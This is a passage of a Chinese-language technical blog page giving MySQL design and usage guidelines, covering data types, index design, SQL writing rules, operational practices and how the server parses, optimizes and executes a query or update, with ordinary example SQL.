<h2 id="避免使用TEXT-BLOB数据类型，最常见的TEXT类型可以存储64k的数据"><a href="#避免使用TEXT-BLOB数据类型，最常见的TEXT类型可以存储64k的数据" class="headerlink" title="避免使用TEXT,BLOB数据类型，最常见的TEXT类型可以存储64k的数据"></a>避免使用TEXT,BLOB数据类型，最常见的TEXT类型可以存储64k的数据</h2><h3 id="建议把-BLOB-或是-TEXT-列分离到单独的扩展表中"><a href="#建议把-BLOB-或是-TEXT-列分离到单独的扩展表中" class="headerlink" title="建议把 BLOB 或是 TEXT 列分离到单独的扩展表中"></a>建议把 BLOB 或是 TEXT 列分离到单独的扩展表中</h3><p>MySQL 内存临时表不支持<code>TEXT</code>、<code>BLOB</code>这样的大数据类型，如果查询中包含这样的数据，在排序等操作时，<strong>就不能使用内存临时表，必须使用磁盘临时表进行</strong>。而且对于这种数据，MySQL 还是要进行二次查询，会使 sql 性能变得很差，但是不是说一定不能使用这样的数据类型。</p>
<p>如果一定要使用，建议把<code>BLOB</code>或是<code>TEXT</code>列分离到单独的扩展表中，查询时一定不要使用<code>select *</code>而只需要取出必要的列，不需要<code>TEXT</code>列的数据时不要对该列进行查询。</p>
<h3 id="TEXT-或-BLOB-类型只能使用前缀索引"><a href="#TEXT-或-BLOB-类型只能使用前缀索引" class="headerlink" title="TEXT 或 BLOB 类型只能使用前缀索引"></a>TEXT 或 BLOB 类型只能使用前缀索引</h3><p>因为MySQL 对索引字段长度是有限制的，所以 TEXT 类型只能使用前缀索引，并且 TEXT 列上是不能有默认值的。</p>
<blockquote>
<p><strong>前缀索引</strong>：使用字符串的前几个字符作为索引，例如以下语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ALTER TABLE &#39;table_name&#39; ADD INDEX &#39;index_name&#39; (&#39;column&#39;(8)) USING BTREE;</span><br></pre></td></tr></table></figure>

<p>前缀索引缺点：MySQL中无法使用前缀索引进行<code>ORDER BY</code>和<code>GROUP BY</code>，也无法用来进行覆盖扫描</p>
</blockquote>
<h2 id="避免使用ENUM类型"><a href="#避免使用ENUM类型" class="headerlink" title="避免使用ENUM类型"></a>避免使用ENUM类型</h2><p>修改 ENUM 值需要使用<code>ALTER</code>语句</p>
<p>ENUM 类型的<code>ORDER BY</code>操作效率低，需要额外操作</p>
<p>禁止使用数值作为 ENUM 的枚举值</p>
<h2 id="尽可能把所有列定义为NOT-NULL"><a href="#尽可能把所有列定义为NOT-NULL" class="headerlink" title="尽可能把所有列定义为NOT NULL"></a>尽可能把所有列定义为NOT NULL</h2><p>索引 NULL 列需要额外的空间保存，所以要占用更多的空间。</p>
<p>进行比较和计算时对 NULL 值要做特别的处理</p>
<h2 id="使用-TIMESTAMP（4个字节）或-DATETIME类型（8个字节）存储时间"><a href="#使用-TIMESTAMP（4个字节）或-DATETIME类型（8个字节）存储时间" class="headerlink" title="使用 TIMESTAMP（4个字节）或 DATETIME类型（8个字节）存储时间"></a>使用 TIMESTAMP（4个字节）或 DATETIME类型（8个字节）存储时间</h2><p>TIMESTAMP 存储的时间范围是<code>1970-01-01 00:00:01 ~ 2038-01-19 03:14:07</code></p>
<p>TIMESTAMP 占用4字节与 INT 相同，但比 INT 可读性高</p>
<p>超出 TIMESTAMP 取值范围的使用 DATETIME 存储数据</p>
<p>MySQL 提供了<code>FROM_UNIXTIME()</code>函数把 UNIX 时间戳转换为日期，并提供了<code>UNIX_TIMESTAMP()</code> 函数把日期转换为 UNIX 时间戳。</p>
<p>默认情况下，如果插入时没有指定 TIMESTAMP 列的值，会将这个值设置为当前时间。</p>
<p>应该尽量使用 TIMESTAMP，因为它比 DATETIME 空间效率更高。</p>
<p>使用字符串存储时间的缺点：</p>
<ul>
<li>无法用日期函数进行计算和比较</li>
<li>用字符串存储日期要占用更多的空间</li>
</ul>
<h2 id="同财务相关的金额类数据必须使用-decimal-类型"><a href="#同财务相关的金额类数据必须使用-decimal-类型" class="headerlink" title="同财务相关的金额类数据必须使用 decimal 类型"></a>同财务相关的金额类数据必须使用 decimal 类型</h2><ul>
<li>非精准浮点：<code>float</code>,<code>double</code></li>
<li>精准浮点：<code>decimal</code></li>
</ul>
<p>Decimal 类型为精准浮点数，在计算时不会丢失精度</p>
<p>占用空间由定义的宽度决定，<strong>每 4 个字节可以存储 9 位数字，并且小数点要占用一个字节</strong></p>
<p>可用于存储比<code>bigint</code>更大的整型数据</p>
<h2 id="VARCHAR-和-CHAR"><a href="#VARCHAR-和-CHAR" class="headerlink" title="VARCHAR 和 CHAR"></a>VARCHAR 和 CHAR</h2><p>在不能确定字段需要多少字符时使用 VARCHAR 类型可以大大地节约磁盘空间、提高存储效率。但如果确切知道字符串长度,比如就在50~55之间,那就用 CHAR 因为 CHAR 类型由于本身定长的特性使其性能要高于 VARCHAR。如uuid，MD5</p>
<h1 id="22-索引设计规范"><a href="#22-索引设计规范" class="headerlink" title="22. 索引设计规范"></a>22. 索引设计规范</h1><h2 id="限制每张表上的索引数量-建议单张表索引不超过-5-个"><a href="#限制每张表上的索引数量-建议单张表索引不超过-5-个" class="headerlink" title="限制每张表上的索引数量,建议单张表索引不超过 5 个"></a>限制每张表上的索引数量,建议单张表索引不超过 5 个</h2><p>索引并不是越多越好，索引可以提高效率同样可以降低效率。</p>
<p>索引可以增加查询效率，但同样也会降低插入和更新的效率，甚至有些情况下会降低查询效率，过多索引不仅增加磁盘空间，而且更新插入数据都要动态维护索引，</p>
<p>因为 MySQL 优化器在选择如何优化查询时，会根据统一信息，对每一个可以用到的索引来进行评估，以生成出一个最好的执行计划，如果同时有很多个索引都可以用于查询，就会增加 MySQL 优化器生成执行计划的时间，同样会降低查询性能。</p>
<h2 id="禁止给表中的每一列都建立单独的索引"><a href="#禁止给表中的每一列都建立单独的索引" class="headerlink" title="禁止给表中的每一列都建立单独的索引"></a>禁止给表中的每一列都建立单独的索引</h2><ul>
<li>当对表中的数据进行增加、删除和修改的时候，索引也要动态的维护，这样就降低了数据的维护速度</li>
<li>索引需要占用物理空间，除了数据表占据数据空间之外，每一个索引还要占一定的物理空间，如果要建立聚簇索引，那么需要的空间就会更大</li>
<li>创建索引和维护索引要耗费时间，这种时间随着数据量的增加而增加</li>
</ul>
<p>5.6版本之前，一个sql只能使用到一个表中的一个索引，5.6以后，虽然有了合并索引的优化方式，但是还是远远没有使用一个联合索引的查询方式好。</p>
<h2 id="每个Innodb表必须有个主键"><a href="#每个Innodb表必须有个主键" class="headerlink" title="每个Innodb表必须有个主键"></a>每个Innodb表必须有个主键</h2><p>Innodb是一种索引组织表：数据的存储的逻辑顺序和索引的顺序是相同的。每个表都可以有多个索引，但是表的存储顺序只能有一种。</p>
<p>Innodb是按照主键索引的顺序来组织表的：</p>
<ul>
<li>不要使用更新频繁的列作为主键，不适用多列主键（相当于联合索引）</li>
<li>不要使用 UUID，MD5，HASH，字符串列作为主键（无法保证数据的顺序增长）</li>
<li>主键建议使用自增ID值</li>
</ul>
<h2 id="常见索引列建议"><a href="#常见索引列建议" class="headerlink" title="常见索引列建议"></a>常见索引列建议</h2><ul>
<li>出现在<code>SELECT</code>,<code>UPDATE</code>,<code>DELETE</code>语句的<code>WHERE</code>从句中的列</li>
<li>包含在<code>ORDER BY</code>,<code>GROUP BY</code>,<code>DISTINCT</code>中的字段</li>
<li>并不要将符合1和2中的字段的列都建立一个索引，通常将1、2中的字段建立联合索引效果更好</li>
<li>多表<code>join</code>的关联列</li>
</ul>
<h2 id="如果选择索引的顺序"><a href="#如果选择索引的顺序" class="headerlink" title="如果选择索引的顺序"></a>如果选择索引的顺序</h2><p>建立索引的目的是：希望通过索引进行数据查找，减少随机IO，增加查询性能，索引能过滤出越少的数据，则从磁盘中读入的数据就越少。</p>
<ul>
<li>区分度最高的放在联合索引的最左侧</li>
<li>尽量把字段长度小的列放在联合索引的最左侧（因为字段长度越小，一页能存储的数据量越大，IO性能也就越好）</li>
<li>使用最频繁的列放到联合索引的左侧（这样可以比较少的建立一些索引）</li>
</ul>
<h2 id="避免建立冗余索引和重复索引（增加了查询优化器生成执行计划的时间）"><a href="#避免建立冗余索引和重复索引（增加了查询优化器生成执行计划的时间）" class="headerlink" title="避免建立冗余索引和重复索引（增加了查询优化器生成执行计划的时间）"></a>避免建立冗余索引和重复索引（增加了查询优化器生成执行计划的时间）</h2><ul>
<li>重复索引示例：<code>primary key(id)</code>,<code>index(id)</code>,<code>unique index(id)</code></li>
<li>冗余索引示例：<code>index(a,b,c)</code>,<code>index(a,b)</code>,<code>index(a)</code></li>
</ul>
<h2 id="对于频繁的查询优先考虑使用覆盖索引"><a href="#对于频繁的查询优先考虑使用覆盖索引" class="headerlink" title="对于频繁的查询优先考虑使用覆盖索引"></a>对于频繁的查询优先考虑使用覆盖索引</h2><blockquote>
<p>覆盖索引：就是包含了所有查询字段（<code>where</code>,<code>select</code>,<code>order by</code>,<code>group by</code>包含的字段）的索引</p>
</blockquote>
<p>覆盖索引的好处：</p>
<ul>
<li><p><strong>避免Innodb表进行索引的二次查询</strong>：Innodb是以聚集索引的顺序来存储的，对于Innodb来说，二级索引在叶子节点中所保存的是行的主键信息，如果是用二级索引查询数据的话，在查找到相应的键值后，还要通过主键进行二次查询才能获取我们真实需要的数据。而在覆盖索引中，二级索引的键值中可以获取所有的数据，避免了对主键的二次查询，减少了IO操作，提升了查询效率。<br>例如：创建了索引<code>(username,age)</code>,在查询数据的时候如下，则查询出的列在叶子节点都存在，所以就不用进行二次查询，即“回表”。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT username,age FROM user WHERE username &#x3D; &#39;java&#39; and age &#x3D; &#39;22&#39;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>可以把随机IO变成顺序IO加快查询效率</strong>：由于覆盖索引是按键值的顺序存储的，对于IO密集型的范围查找来说，对比随机从磁盘读取每一行的数据IO要少的多，因此利用覆盖索引在访问时也可以把磁盘的随机读取IO转变成索引查找的顺序IO。</p>
</li>
</ul>
<h2 id="索引SET规范"><a href="#索引SET规范" class="headerlink" title="索引SET规范"></a>索引SET规范</h2><p>尽量避免使用外键约束</p>
<ul>
<li>不建议使用外键约束（foreign key），但一定要在表与表之间的关联键上建立索引</li>
<li>外键可用于保证数据的参照完整性，但建议在业务端实现</li>
<li>外键会影响父表和子表的写操作从而降低性能</li>
</ul>
<h2 id="使用索引的注意事项"><a href="#使用索引的注意事项" class="headerlink" title="使用索引的注意事项"></a>使用索引的注意事项</h2><ul>
<li>在经常需要搜索的列上，可以加快搜索的速度</li>
<li>在经常使用<code>WHERE</code>子句中的列上面创建索引，加快条件的判断速度</li>
<li>在经常需要排序的列上创建索引，因为索引已经排序，这样查询可以利用索引的顺序，加快排序查询时间</li>
<li>对于中到大型表索引都是非常有效的，但是特大型表的话维护开销会很大，不适合建索引</li>
<li>在经常用在连接的列上，这些列主要是一些外键，可以加快连接的速度</li>
<li>避免在<code>WHERE</code>子句中对字段施加函数，这会造成无法命中索引</li>
<li>在使用<code>InnoDB</code>时使用与业务无关的自增主键作为主键，即使用逻辑主键，而不要使用业务主键。</li>
<li><del>将打算加索引的列设置为<code>NOT NULL</code>，否则将会导致引擎放弃使用索引而进行全表扫描</del></li>
<li>删除长期未使用的索引，不用的索引的存在会造成不必要的性能损耗。MySQL5.7可以通过查询<code>sys</code>库的<code>chema_unused_indexes</code>视图来查询哪些索引从未被使用</li>
<li>在使用<code>limit offset</code>查询缓存时，可以借助索引来提高性能</li>
<li>数据量很少的表不要建索引，全表查询效率比遍历索引可能还快</li>
</ul>
<h1 id="23-数据库SQL开发规范"><a href="#23-数据库SQL开发规范" class="headerlink" title="23. 数据库SQL开发规范"></a>23. 数据库SQL开发规范</h1><h2 id="建议使用预编译语句进行数据库操作"><a href="#建议使用预编译语句进行数据库操作" class="headerlink" title="建议使用预编译语句进行数据库操作"></a>建议使用预编译语句进行数据库操作</h2><p>预编译语句可以重复使用这些计划，减少SQL编译所需要的时间，还可以解决动态SQL所带来的SQL注入问题</p>
<p>只传参数，比传递SQL语句更高效</p>
<p>相同的语句可以一次解析，多次使用，提高处理效率。</p>
<h2 id="避免数据类型的隐式转换"><a href="#避免数据类型的隐式转换" class="headerlink" title="避免数据类型的隐式转换"></a>避免数据类型的隐式转换</h2><p>隐式转换会导致索引失效：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT name,phone FROM customer WHERE id &#x3D; &#39;111&#39;;</span><br></pre></td></tr></table></figure>

<h2 id="充分利用表上已经存在的索引"><a href="#充分利用表上已经存在的索引" class="headerlink" title="充分利用表上已经存在的索引"></a>充分利用表上已经存在的索引</h2><p>避免使用双<code>%</code>号的查询条件，如：<code>a like &#39;%123%&#39;</code>,(如果无前置<code>%</code>,只有后置<code>%</code>,是可以用到列上的索引的)</p>
<p>一个SQL只能利用到复合索引中的一列进行<strong>范围查询</strong>。如：有a，b，c列的联合索引，在查询条件中有a列的范围查询，则在b，c列上的索引将不会被用到。</p>
<p>在定义联合索引时，如果a列要用到范围查找的话，就要把a列放到联合索引的右侧，使用<code>left join</code>或者<code>not exists</code>来优化<code>not in</code>操作，因为<code>not in</code>也通常会使索引失效。</p>
<h2 id="数据库设计时，应该要对以后扩展进行考虑"><a href="#数据库设计时，应该要对以后扩展进行考虑" class="headerlink" title="数据库设计时，应该要对以后扩展进行考虑"></a>数据库设计时，应该要对以后扩展进行考虑</h2><h2 id="程序连接不同的数据库使用不同的账号，禁止跨库查询"><a href="#程序连接不同的数据库使用不同的账号，禁止跨库查询" class="headerlink" title="程序连接不同的数据库使用不同的账号，禁止跨库查询"></a>程序连接不同的数据库使用不同的账号，禁止跨库查询</h2><ul>
<li>为数据库迁移和分库分表留出余地</li>
<li>降低业务耦合度</li>
<li>避免权限过大而产生的安全风险</li>
</ul>
<h2 id="禁止使用-SELECT-必须使用-SELECT-lt-字段列表-gt-查询"><a href="#禁止使用-SELECT-必须使用-SELECT-lt-字段列表-gt-查询" class="headerlink" title="禁止使用 SELECT * 必须使用 SELECT &lt;字段列表&gt; 查询"></a>禁止使用 SELECT * 必须使用 SELECT &lt;字段列表&gt; 查询</h2><p>原因：</p>
<ul>
<li>消耗更多的 CPU 和 IO 以网络带宽资源</li>
<li>无法使用覆盖索引</li>
<li>可减少表结构变更带来的影响</li>
</ul>
<h2 id="禁止使用不含字段列表的INSERT语句"><a href="#禁止使用不含字段列表的INSERT语句" class="headerlink" title="禁止使用不含字段列表的INSERT语句"></a>禁止使用不含字段列表的INSERT语句</h2><p>如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into t values(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;);</span><br></pre></td></tr></table></figure>

<p>应使用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into t(c1,c2,c3) values(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;);</span><br></pre></td></tr></table></figure>

<h2 id="避免使用子查询，可以把子查询优化为join操作"><a href="#避免使用子查询，可以把子查询优化为join操作" class="headerlink" title="避免使用子查询，可以把子查询优化为join操作"></a>避免使用子查询，可以把子查询优化为join操作</h2><p>通常子查询在<code>in</code>子句中，且子查询中为简单SQL（不包含<code>union</code>,<code>group by</code>,<code>order by</code>,<code>limit</code>从句）时，才可以把子查询转化为关联查询进行优化。</p>
<p><strong>子查询性能差的原因</strong>：</p>
<p>子查询的结果集无法使用索引，通常子查询的结果集会被存储到临时表中，不论是内存临时表还是磁盘临时表，都不会存在索引，所以查询性能会受到一定的影响。特别是对于返回结果集比较大的子查询，其对查询性能的影响也就越大。</p>
<p>由于子查询会产生大量的临时表也没有索引，所以会消耗过多的CPU和IO资源，产生大量的慢查询</p>
<h2 id="避免使用JOIN关联太多的表"><a href="#避免使用JOIN关联太多的表" class="headerlink" title="避免使用JOIN关联太多的表"></a>避免使用JOIN关联太多的表</h2><p>对于MySQL来说，是存在关联缓存的，缓存的大小可以由<code>join_buffer_size</code>参数进行设置。</p>
<p>在MySQL中，对于同一个SQL多关联（join）一个表，就会多分配一个关联缓存，如果在一个SQL中关联的表越多，所占用的内存也就越大。</p>
<p>如果程序中大量的使用了多表关联的操作，同时<code>join_buffer_size</code>设置的也合理的情况下，就容易造成服务器内存溢出的情况，就会影响到服务器数据库性能的稳定性。</p>
<p>同时对于关联操作来说，会产生临时表操作，影响查询效率，MySQL最多允许关联61个表，建议不超过5个。</p>
<h2 id="减少同数据库的交互次数"><a href="#减少同数据库的交互次数" class="headerlink" title="减少同数据库的交互次数"></a>减少同数据库的交互次数</h2><p>数据库更适合处理批量操作，合并多个相同的操作到一起，可以提高处理效率。</p>
<h2 id="对应同一列进行-or-判断时，使用-in-代替-or"><a href="#对应同一列进行-or-判断时，使用-in-代替-or" class="headerlink" title="对应同一列进行 or 判断时，使用 in 代替 or"></a>对应同一列进行 or 判断时，使用 in 代替 or</h2><p>in 的值不要超过 500 个，in 操作可以更有效的利用索引，or 大多数情况下很少能利用到索引。</p>
<h2 id="禁止使用-order-by-rand-进行随机排序"><a href="#禁止使用-order-by-rand-进行随机排序" class="headerlink" title="禁止使用 order by rand() 进行随机排序"></a>禁止使用 order by rand() 进行随机排序</h2><p><code>order by rand()</code>会把表中所有符合条件的数据装载到内存中，然后在内存中对所有数据根据随机生成的值进行排序，并且可能会对每一行都生成一个随机值，如果满足条件的数据集非常大，就会消耗大量的 CPU 和 IO 及内存资源。</p>
<h2 id="WHERE-从句中禁止对列进行函数转换和计算"><a href="#WHERE-从句中禁止对列进行函数转换和计算" class="headerlink" title="WHERE 从句中禁止对列进行函数转换和计算"></a>WHERE 从句中禁止对列进行函数转换和计算</h2><p>对列进行函数转换或计算时会导致无法使用索引</p>
<p>不推荐：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">where date(create_time)&#x3D;&#39;20190101&#39;</span><br></pre></td></tr></table></figure>

<p>推荐：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">where create_time &gt;&#x3D; &#39;20190101&#39; and create_time &lt; &#39;20190102&#39;</span><br></pre></td></tr></table></figure>

<h2 id="在明显不会有重复值时使用-UNION-ALL-而不是-UNION"><a href="#在明显不会有重复值时使用-UNION-ALL-而不是-UNION" class="headerlink" title="在明显不会有重复值时使用 UNION ALL 而不是 UNION"></a>在明显不会有重复值时使用 UNION ALL 而不是 UNION</h2><ul>
<li><code>UNION</code>会把两个结果集的所有数据放到临时表中后再进行去重操作</li>
<li><code>UNION ALL</code>不会再对结果集进行去重操作</li>
</ul>
<h2 id="拆分复杂的大-SQL-为多个小-SQL"><a href="#拆分复杂的大-SQL-为多个小-SQL" class="headerlink" title="拆分复杂的大 SQL 为多个小 SQL"></a>拆分复杂的大 SQL 为多个小 SQL</h2><ul>
<li>大 SQL 逻辑上比较复杂，需要占用大量 CPU 进行计算的 SQL</li>
<li>MySQL 中，一个 SQL 只能使用一个 CPU 进行计算</li>
<li>SQL 拆分后可以通过并行执行来提高处理效率</li>
</ul>
<h1 id="24-数据库操作行为规范"><a href="#24-数据库操作行为规范" class="headerlink" title="24. 数据库操作行为规范"></a>24. 数据库操作行为规范</h1><h2 id="超100万行的批量写（UPDATE，DELETE，INSERT）操作，要分批多次进行操作"><a href="#超100万行的批量写（UPDATE，DELETE，INSERT）操作，要分批多次进行操作" class="headerlink" title="超100万行的批量写（UPDATE，DELETE，INSERT）操作，要分批多次进行操作"></a>超100万行的批量写（<code>UPDATE</code>，<code>DELETE</code>，<code>INSERT</code>）操作，要分批多次进行操作</h2><h3 id="大批量操作可能会造成严重的主从延迟"><a href="#大批量操作可能会造成严重的主从延迟" class="headerlink" title="大批量操作可能会造成严重的主从延迟"></a>大批量操作可能会造成严重的主从延迟</h3><p>主从环境中,大批量操作可能会造成严重的主从延迟，大批量的写操作一般都需要执行一定长的时间， 而只有当主库上执行完成后，才会在其他从库上执行，所以会造成主库与从库长时间的延迟情况</p>
<h3 id="binlog-日志为-row-格式时会产生大量的日志"><a href="#binlog-日志为-row-格式时会产生大量的日志" class="headerlink" title="binlog 日志为 row 格式时会产生大量的日志"></a>binlog 日志为 row 格式时会产生大量的日志</h3><p>大批量写操作会产生大量日志，特别是对于<code>row</code>格式二进制数据而言，由于在<code>row</code>格式中会记录每一行数据的修改，我们一次修改的数据越多，产生的日志量也就会越多，日志的传输和恢复所需要的时间也就越长，这也是造成主从延迟的一个原因</p>
<h3 id="避免产生大事务操作"><a href="#避免产生大事务操作" class="headerlink" title="避免产生大事务操作"></a>避免产生大事务操作</h3><p>大批量修改数据，一定是在一个事务中进行的，这就会造成表中大批量数据进行锁定，从而导致大量的阻塞，阻塞会对 MySQL 的性能产生非常大的影响。</p>
<h2 id="对于大表使用pt-online-schema-change修改表结构"><a href="#对于大表使用pt-online-schema-change修改表结构" class="headerlink" title="对于大表使用pt-online-schema-change修改表结构"></a>对于大表使用<code>pt-online-schema-change</code>修改表结构</h2><ul>
<li><p>避免大表修改产生的主从延迟</p>
</li>
<li><p>避免在对表字段进行修改时进行锁表</p>
<blockquote>
<p><code>pt-online-schema-change</code>是用于管理维护MySQL的小工具</p>
</blockquote>
</li>
</ul>
<p>对大表数据结构的修改一定要谨慎，会造成严重的锁表操作，尤其是生产环境，是不能容忍的。</p>
<p><code>pt-online-schema-change</code>它会首先建立一个与原表结构相同的新表，并且在新表上进行表结构的修改，然后再把原表中的数据复制到新表中，并在原表中增加一些触发器。把原表中新增的数据也复制到新表中，在行所有数据复制完成之后，把新表命名成原表，并把原来的表删除掉。把原来一个 DDL 操作，分解成多个小的批次进行。</p>
<h2 id="禁止为程序使用的账号赋予super权限"><a href="#禁止为程序使用的账号赋予super权限" class="headerlink" title="禁止为程序使用的账号赋予super权限"></a>禁止为程序使用的账号赋予<code>super</code>权限</h2><ul>
<li>当达到最大连接数限制时，还运行一个有<code>super</code>权限的用户连接</li>
<li><code>super</code>权限只能留给DBA处理问题的账号使用</li>
</ul>
<h2 id="对于程序连接数据库账号，遵循权限最小原则"><a href="#对于程序连接数据库账号，遵循权限最小原则" class="headerlink" title="对于程序连接数据库账号，遵循权限最小原则"></a>对于程序连接数据库账号，遵循权限最小原则</h2><ul>
<li>程序使用数据库账号只能在一个DB下使用，不准垮库</li>
<li>程序使用的账号原则上不准有<code>drop</code>权限</li>
</ul>
<h1 id="25-一条sql语句在MySQL中如何执行"><a href="#25-一条sql语句在MySQL中如何执行" class="headerlink" title="25. 一条sql语句在MySQL中如何执行"></a>25. 一条sql语句在MySQL中如何执行</h1><p>在MySQL中，有以下基本组件：</p>
<ul>
<li><strong>连接器</strong>：身份认证和权限相关（登录MySQL的时候）</li>
<li><strong>查询缓存</strong>：执行查询语句的时候，会先查询缓存（MySQL8.0版本后移除，因为这个功能不太实用）</li>
<li><strong>分析器</strong>：如果没有命中缓存的话，SQL语句就会经过分析器，分析器说白了就是要先看你的 SQL 语句要干嘛，再检查你的 SQL 语句语法是否正确。</li>
<li><strong>优化器</strong>：按照MySQL认为最优的方案去执行</li>
<li><strong>执行器</strong>：执行语句，然后从存储引擎返回数据</li>
</ul>
<p><img src="https://camo.githubusercontent.com/7ef46ccad045efe1f2aadedcabbc69bb3f4108b9/68747470733a2f2f757365722d676f6c642d63646e2e786974752e696f2f323031392f332f32332f313639613862633630613038333834393f773d39353026683d3130363226663d6a70656726733d3338313839" alt="MySQL组件"></p>
<p>简单来说MySQL主要分为<strong>Server层</strong>和<strong>存储引擎层</strong>：</p>
<ul>
<li><strong>Server层</strong>：主要包括连接器、查询缓存、分析器、优化器、执行器等，所有跨存储引擎的功能都在这一层实现，比如存储过程、触发器、视图，函数等，还有一个通用的日志模块<code>binlog</code>日志模块。</li>
<li><strong>存储引擎</strong>：主要负责数据的存储和读取，采用可以替换的插件式架构，支持<code>InnoDB</code>,<code>MyISAM</code>,<code>Memory</code>等多个存储引擎，**其中<code>InnoDB</code>引擎自有日志模块<code>redolog</code>**。现在最常用的存储引擎是<code>InnoDB</code>，它从 MySQL 5.5.5 版本开始就被当做默认存储引擎了。</li>
</ul>
<h2 id="Server层基本组件功能"><a href="#Server层基本组件功能" class="headerlink" title="Server层基本组件功能"></a>Server层基本组件功能</h2><h3 id="连接器"><a href="#连接器" class="headerlink" title="连接器"></a>连接器</h3><p>连接器主要和身份认证和权限相关的功能相关，就好比一个级别很高的门卫一样。</p>
<p>主要负责用户登录数据库，进行用户的身份认证，包括校验账户密码，权限等操作，如果用户账户密码已通过，连接器会到权限表中查询该用户的所有权限，之后在这个连接里的权限逻辑判断都是会依赖此时读取到的权限数据，也就是说，<strong>后续只要这个连接不断开，即时管理员修改了该用户的权限，该用户也是不受影响的</strong></p>
<h3 id="查询缓存（MySQL8-0版本后移除）"><a href="#查询缓存（MySQL8-0版本后移除）" class="headerlink" title="查询缓存（MySQL8.0版本后移除）"></a>查询缓存（MySQL8.0版本后移除）</h3><p>查询缓存主要用来缓存我们所执行的 SELECT 语句以及该语句的结果集。</p>
<p>连接建立后，执行查询语句的时候，会先查询缓存，MySQL 会先校验这个 sql 是否执行过，以 Key-Value 的形式缓存在内存中，Key 是查询预计，Value 是结果集。如果缓存 key 被命中，就会直接返回给客户端，如果没有命中，就会执行后续的操作，完成后也会把结果缓存起来，方便下一次调用。当然在真正执行缓存查询的时候还是会校验用户的权限，是否有该表的查询条件。</p>
<p>MySQL 查询不建议使用缓存，因为查询缓存失效在实际业务场景中可能会非常频繁，假如你对一个表更新的话，这个表上的所有的查询缓存都会被清空。对于不经常更新的数据来说，使用缓存还是可以的。</p>
<p>所以，一般在大多数情况下我们都是不推荐去使用查询缓存的。</p>
<p>MySQL 8.0 版本后删除了缓存的功能，官方也是认为该功能在实际的应用场景比较少，所以干脆直接删掉了。</p>
<h3 id="分析器"><a href="#分析器" class="headerlink" title="分析器"></a>分析器</h3><p>MySQL 没有命中缓存，那么就会进入分析器，分析器主要是用来分析 SQL 语句是来干嘛的，分析器也会分为几步：</p>
<ul>
<li><strong>第一步，词法分析</strong>：一条SQL语句由多个字符串组成。首先提取关键词，比如：<code>SELECT</code>,然后提出查询的表，提出字段名，提出查询条件等等。做完这些操作后，就会进入第二步。</li>
<li><strong>第二步，语法分析</strong>：主要就是判断输入的sql是否正确，是否符合MySQL的语法。</li>
</ul>
<p>完成了这2步之后，MySQL就准备开始执行了，但是如何执行，怎么执行的结果最好，就需要到优化器中去判断。</p>
<h3 id="优化器"><a href="#优化器" class="headerlink" title="优化器"></a>优化器</h3><p>优化器的作用就是它认为的最优的执行方案去执行（有时候可能也不是最优），比如多个索引的时候该如何选择索引，多表查询的时候如何选择关联顺序等。</p>
<p>可以说，经过了优化器之后可以说这个语句具体该如何执行就已经定下来。</p>
<h3 id="执行器"><a href="#执行器" class="headerlink" title="执行器"></a>执行器</h3><p>当选择了执行方案后，MySQL就准备开始执行了，首先，执行前<strong>会检验该用户有没有权限</strong>，如果没有权限，就会返回错误信息，如果有权限，就会去调用引擎的接口，返回接口执行的结果。</p>
<h2 id="具体语句分析"><a href="#具体语句分析" class="headerlink" title="具体语句分析"></a>具体语句分析</h2><p>sql语句可以分为两种，一种是查询，一种是更新（增加，更新，删除）。</p>
<h3 id="查询语句"><a href="#查询语句" class="headerlink" title="查询语句"></a>查询语句</h3><p>例如下面语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM tb_student A WHERE A.age &#x3D; 18 AND A.name &#x3D; &#39;张三&#39;;</span><br></pre></td></tr></table></figure>

<p>这条语句的执行流程是：</p>
<ul>
<li><p>先检查该语句是否有权限，如果没有权限，直接返回错误信息，如果有权限，在 MySQL8.0 版本以前，会先查询缓存，以这条 sql 语句为<code>key</code>在内存中查询是否有结果，如果有直接缓存，如果没有，执行下一步。</p>
</li>
<li><p>通过分析器进行词法分析，提取 sql 语句的关键元素，比如提取上面这个语句是查询<code>select</code>，提取需要查询的表名为<code>tb_student</code>,需要查询所有的列，查询条件是这个表的<code>id=&#39;1&#39;</code>。然后判断这个 sql 语句是否有语法错误，比如关键词是否正确等等，如果检查没问题就执行下一步。</p>
</li>
<li><p>接下来就是优化器进行确认执行方案，上面的sql语句，可以有两种执行方案：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a. 先查询学生表中姓名为“张三”的学生，然后判断是否年龄是18</span><br><span class="line">b. 先找出学生中年龄18岁的学生，然后再查询姓名为“张三”的学生</span><br></pre></td></tr></table></figure>

<p>优化器根据自己的优化算法进行选择执行效率最好的一个方案（优化器认为，有时候不一定最好）。那么确认了执行计划后就准备开始执行了。</p>
</li>
<li><p>进行权限校验，如果没有权限就会返回错误信息，如果有权限就会调用数据库引擎接口，返回引擎的执行结果。</p>
</li>
</ul>
<h3 id="更新语句"><a href="#更新语句" class="headerlink" title="更新语句"></a>更新语句</h3><p>对于以下sql语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UPDATE tb_student A SET A.age &#x3D; 19 WHERE A.name &#x3D; &#39;张三&#39;;</span><br></pre></td></tr></table></figure>

<p>这条语句也基本会沿着上一个查询的流程走，只不过在执行更新的时候要<strong>记录日志</strong>，这就会引入日志模块了。MySQL自带的日志模块是<code>binlog</code>(<strong>归档日志</strong>)，所有的存储引擎都可以使用。而InnoDB引擎还自带了一个日志模块<code>redo log</code>(<strong>重做日志</strong>),下面以InnoDB模式进行流程说明：</p>
<ul>
<li>先查询到张三这一条数据，如果有缓存，就会用到缓存</li>
<li>然后拿到查询的语句，把<code>age</code>改为19，然后再调用引擎API接口，写入这一行数据，InnoDB引擎把数据保存在内存中，<strong>同时记录<code>redo log</code>,此时<code>redo log</code>进入<code>prepare</code>状态，然后告诉执行器，执行完成了，随时可以提交</strong></li>
